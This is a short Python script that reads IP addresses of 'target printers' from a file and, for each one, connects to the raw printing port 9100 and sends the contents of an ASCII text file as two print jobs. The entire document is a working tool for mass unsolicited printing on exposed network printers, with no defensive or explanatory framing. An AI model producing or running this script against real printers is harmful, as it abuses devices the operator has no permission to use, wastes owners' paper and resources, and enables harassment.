import socket
with open("IPs.txt") as f: #file containing IPs of target printers
    lines = f.read().splitlines() 
print("-Reading IPs file-")
for ip in lines:
	textfile = open("bot.txt", "r") #ascii file to be printed
	textlines = textfile.readlines()
	for count in range(0,2): #number of print jobs
		s = socket.socket()
		s.connect((ip, 9100))
		for line in textlines:
			s.send(str.encode(line))
			print("-Sending to Printer-")
		s.close()
